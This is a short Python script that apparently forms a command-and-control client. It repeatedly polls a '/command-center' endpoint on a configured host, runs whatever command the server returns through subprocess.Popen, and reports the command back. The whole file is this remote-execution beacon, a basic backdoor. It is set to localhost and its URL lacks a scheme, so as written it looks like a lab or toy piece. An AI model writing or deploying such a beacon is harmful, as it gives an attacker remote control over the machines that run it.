from requests import post, get
from subprocess import Popen
from time import sleep

DELAY = 5
IP = "127.0.0.1"
PORT = 80


def main() -> None:
    while True:
        get_commands_response = get(f"{IP}:{PORT}/command-center")
        if get_commands_response.status_code != 204:
            Popen(get_commands_response.text)
            post(
                f"{IP}:{PORT}/command-center",
                data={"command": get_commands_response.text},
            )
        sleep(DELAY)


if __name__ == "__main__":
    main()
